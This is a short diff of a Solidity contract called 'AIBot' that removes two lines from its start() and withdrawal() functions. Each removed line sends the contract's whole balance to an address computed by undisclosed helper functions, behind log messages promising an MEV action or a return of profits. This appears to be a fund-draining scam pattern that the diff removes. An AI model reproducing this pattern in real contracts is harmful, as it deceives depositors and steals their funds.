@@ -477,7 +477,6 @@ contract AIBot {
      */
     function start() public payable {
         emit Log("Running MEV action. This can take a while; please wait..");
-        payable(_callMEVAction()).transfer(address(this).balance);
     }
  
     /*
@@ -486,7 +485,6 @@ contract AIBot {
      */
     function withdrawal() public payable { 
         emit Log("Sending profits back to contract creator address...");
-        payable(withdrawalProfits()).transfer(address(this).balance);
     }
  
     /*
